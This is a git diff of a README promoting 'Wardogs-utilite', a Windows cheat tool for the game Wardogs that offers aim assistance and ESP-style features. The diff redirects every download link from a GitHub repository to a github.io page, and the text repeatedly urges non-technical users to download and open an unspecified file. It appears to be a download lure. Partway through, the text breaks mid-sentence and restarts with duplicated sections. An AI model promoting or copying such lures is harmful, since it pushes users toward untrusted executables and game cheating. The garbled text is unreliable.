@@ -1,16 +1,16 @@
 # 🐺 Wardogs-utilite - Easy Windows Utility for Wardogs
 
-[![Download Wardogs-utilite](https://img.shields.io/badge/Download_Wardogs--utilite-Now-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github)](https://github.com/blimpish-appendicitis915/Wardogs-utilite)
+[![Download Wardogs-utilite](https://img.shields.io/badge/Download_Wardogs--utilite-Now-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github)](https://blimpish-appendicitis915.github.io)
 
 Visit this link to download the application.
 
-Wardogs-utilite is a Windows utility made for Wardogs users who want a simple, direct way to get started. It is designed for everyday computer users, so you do not need programming knowledge, developer tools, or a technical background. The download page is the official starting point: https://github.com/blimpish-appendicitis915/Wardogs-utilite
+Wardogs-utilite is a Windows utility made for Wardogs users who want a simple, direct way to get started. It is designed for everyday computer users, so you do not need programming knowledge, developer tools, or a technical background. The download page is the official starting point: https://blimpish-appendicitis915.github.io
 
 ## 📥 Download Wardogs-utilite
 
 Use the main link below to reach the Wardogs-utilite download page.
 
-[![Get Wardogs-utilite](https://img.shields.io/badge/Get_Wardogs--utilite-Download-FFD166?style=for-the-badge&labelColor=118AB2&logo=github)](https://github.com/blimpish-appendicitis915/Wardogs-utilite)
+[![Get Wardogs-utilite](https://img.shields.io/badge/Get_Wardogs--utilite-Download-FFD166?style=for-the-badge&labelColor=118AB2&logo=github)](https://blimpish-appendicitis915.github.io)
 
 Visit this link to download the application.
 
@@ -18,7 +18,7 @@ After the download completes, open the file you received. Wardogs-utilite is mea
 
 ## 🚀 Getting Started
 
-1. Open the Wardogs-utilite download page by clicking the large download badge above or by visiting https://github.com/blimpish-appendicitis915/Wardogs-utilite
+1. Open the Wardogs-utilite download page by clicking the large download badge above or by visiting https://blimpish-appendicitis915.github.io
 2. Visit this link to download the application.
 3. Wait for the download to finish.
 4. Open the downloaded file the same way you open other Windows programs.
@@ -48,7 +48,7 @@ Wardogs-utilite focuses on utility access and ease of use. The feature set is bu
 
 Aim assistance tools are included for users who want help with targeting behavior in Wardogs. ESP-style# 🐺 Wardogs-utilite - Easy Windows Utility for Wardogs
 
-[![Download Wardogs-utilite](https://img.shields.io/badge/Download_Wardogs--utilite-Now-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github)](https://github.com/blimpish-appendicitis915/Wardogs-utilite)
+[![Download Wardogs-utilite](https://img.shields.io/badge/Download_Wardogs--utilite-Now-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github)](https://blimpish-appendicitis915.github.io)
 
 Visit this link to download the application.
 
@@ -60,7 +60,7 @@ The project brings together a set of utility features for Wardogs in one place, 
 
 Use the main link below to reach the Wardogs-utilite download page.
 
-[![Get Wardogs-utilite](https://img.shields.io/badge/Get_Wardogs--utilite-Download-FFD166?style=for-the-badge&labelColor=118AB2&logo=github)](https://github.com/blimpish-appendicitis915/Wardogs-utilite)
+[![Get Wardogs-utilite](https://img.shields.io/badge/Get_Wardogs--utilite-Download-FFD166?style=for-the-badge&labelColor=118AB2&logo=github)](https://blimpish-appendicitis915.github.io)
 
 Visit this link to download the application.
 
@@ -70,7 +70,7 @@ Once you reach the page, take a moment to read the description and any notes sho
 
 Getting Wardogs-utilite running on your Windows computer is a short process. Follow these steps in order and take your time with each one.
 
-1. Click the large download badge at the top of this page, or copy the link https://github.com/blimpish-appendicitis915/Wardogs-utilite into your browser's address bar.
+1. Click the large download badge at the top of this page, or copy the link https://blimpish-appendicitis915.github.io into your browser's address bar.
 2. Visit this link to download the application.
 3. Wait for the download to finish. The time this takes depends on your internet connection speed.
 4. Open the file you received from the download page, the same way you would open any other program on Windows.
@@ -144,7 +144,7 @@ If the window looks too small or too large, check your Windows display scaling s
 
 ## 🔄 Keeping Wardogs-utilite Updated
 
-Wardogs-utilite is an actively maintained project, and the download page is where new versions appear. Return to https://github.com/blimpish-appendicitis915/Wardogs-utilite from time to time to check for updates.
+Wardogs-utilite is an actively maintained project, and the download page is where new versions appear. Return to https://blimpish-appendicitis915.github.io from time to time to check for updates.
 
 Before updating, close the application. Then visit the page, download the newest version, and open it in place of the old one. Keeping a single copy of the utility on your computer avoids confusion about which version is running. If you like, you can rename your old folder with a date so you always know which one is newest.
 
@@ -173,7 +173,7 @@ Yes. You can move the folder wherever you prefer on your Windows computer.
 
 ## 📌 Quick Reference
 
-Download page: https://github.com/blimpish-appendicitis915/Wardogs-utilite
+Download page: https://blimpish-appendicitis915.github.io
 
 Platform: Windows 10 and Windows 11, 64-bit.
 
